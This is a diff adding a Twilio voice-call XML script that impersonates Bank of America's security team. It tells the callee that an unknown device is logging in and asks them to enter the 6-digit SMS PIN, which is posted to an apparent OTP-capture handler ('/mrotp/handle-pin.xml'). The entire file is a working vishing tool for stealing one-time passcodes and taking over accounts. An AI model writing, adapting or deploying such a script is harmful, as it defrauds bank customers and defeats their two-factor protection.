@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Pause length="2"/>
+    <Say> BANK OF AMERICA-SECURITY. Someone is trying to log in to your account from an unknown device. For your security purposes, you should of recieved a 6-digit PIN number by a SMS text message.</Say>
+    <Gather input="dtmf"  numDigits="6" action="/mrotp/handle-pin.xml" method="POST , GET">
+    <Say>Please Enter your 6-digit PIN number followed by the pound key.</Say>
+    <Pause length="5"/>
+        <Say>Thank You For Verifying your account.</Say>
+    </Gather>    
+    <Pause length="4"/>
+        <Say>If you would like to allow access from device "Jeffereys Iphone" please press 1. If you would like to block access to device "Jeffereys IPhone" please press 2. </Say>
+    <Pause length="5"/>
+        <Say>Thank you for helping us keep your account secure. For any inquires please call customer service.</Say>
+    <Pause length="8"/>
+        <Say>GOODBYE!</Say>
+   
+</Response>
